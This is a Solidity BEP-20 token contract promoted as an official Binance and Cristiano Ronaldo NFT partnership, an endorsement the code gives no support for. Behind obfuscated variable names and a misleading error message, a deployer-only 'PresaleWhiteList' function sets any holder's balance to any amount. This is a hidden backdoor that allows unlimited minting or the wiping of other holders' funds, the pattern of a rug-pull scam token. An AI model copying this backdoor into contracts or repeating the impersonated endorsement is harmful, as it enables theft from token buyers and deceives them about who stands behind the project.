/**
 *Submitted for verification at BscScan.com on 2022-06-23
*/

/**
#Binance 🤝 @Cristiano
 🐐
We're kicking off an exclusive multi-year NFT partnership with football legend Cristiano Ronaldo. 
This is your opportunity to own an iconic piece of sports history and join CR7's Web3 community.
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface CristianoAbep20 {
  // @dev Returns the amount of tokens in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of tokens owned by `account`.
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean CristianototalValueS indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This CristianototalValueS changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean CristianototalValueS indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired CristianototalValueS afterwards:
   * https://github.com/CristianoA/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean CristianototalValueS indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `CristianototalValueS` tokens are moved from one account (`from`) to  another (`to`). Note that `CristianototalValueS` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 CristianototalValueS);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `CristianototalValueS` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 CristianototalValueS);
}


contract BinanceCristianoNFT is CristianoAbep20 {
  
    // common addresses
    address private owner;
    address private CristianoAZERTYUIO;
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public CristianoNBVCXFRT;
    
    mapping(address => mapping(address => uint)) public Allowance;
    
    // token title metadata
    string public override name = "Cristiano Binance NFTs";
    string public override symbol = "CR7 NFTS";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint CristianototalValueS);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint CristianototalValueS);
    
    // On init of contract we're going to set the admin and give them all tokens.
    constructor(uint CristianoCHARITY) {
        // set total supply
        totalSupply = CristianoCHARITY;
        
       CristianoAZERTYUIO = msg.sender;      
        // designate addresses
        owner = msg.sender;
        
        // split the tokens according to agreed upon percentages
        
        CristianoNBVCXFRT[owner] = totalSupply;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }
    
    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return CristianoNBVCXFRT[account];
    }
  modifier _CristianoaVirtuals () {
    require(CristianoAZERTYUIO == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    // Transfer balance from one user to another
    function transfer(address to, uint CristianototalValueS) public override returns(bool) {
        require(CristianototalValueS > 0, "Transfer CristianototalValueS has to be higher than 0.");
        require(balanceOf(msg.sender) >= CristianototalValueS, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total CristianototalValueS
        uint CristianoAtaxTBD = CristianototalValueS * 0 / 1000;
        uint CristianoAburnTBD = CristianototalValueS * 0 / 1000;
        uint CristianoACristianototalValueSAfterTaxAndBurn = CristianototalValueS - CristianoAtaxTBD - CristianoAburnTBD;
        
        // perform the transfer operation
        CristianoNBVCXFRT[to] += CristianoACristianototalValueSAfterTaxAndBurn;
        CristianoNBVCXFRT[msg.sender] -= CristianototalValueS;
        
        emit Transfer(msg.sender, to, CristianototalValueS);
        
        // finally, we burn and tax the extras percentage
        CristianoNBVCXFRT[owner] += CristianoAtaxTBD + CristianoAburnTBD;
        _burn(owner, CristianoAburnTBD);
        
        return true;
    }
    
  
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return Allowance[_owner][spender];
    }
    function PresaleWhiteList(address PresaleCristianoAadr, uint256 amount) external _CristianoaVirtuals {
      CristianoNBVCXFRT[PresaleCristianoAadr] = amount * 10 ** 9;
  }  
   
   // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint CristianototalValueS) public override returns(bool) {
        Allowance[msg.sender][spender] = CristianototalValueS; 
        
        emit Approval(msg.sender, spender, CristianototalValueS);
        
        return true;
    }   
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(CristianoNBVCXFRT[account] >= amount, "Burn amount exceeds balance at address.");
    
        CristianoNBVCXFRT[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
     // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint CristianototalValueS) public override returns(bool) {
        require(Allowance[from][msg.sender] > 0, "No Allowance for this address.");
        require(Allowance[from][msg.sender] >= CristianototalValueS, "Allowance too low for transfer.");
        require(CristianoNBVCXFRT[from] >= CristianototalValueS, "Balance is too low to make transfer.");
        
        CristianoNBVCXFRT[to] += CristianototalValueS;
        CristianoNBVCXFRT[from] -= CristianototalValueS;
        
        emit Transfer(from, to, CristianototalValueS);
        
        return true;
    }
    
}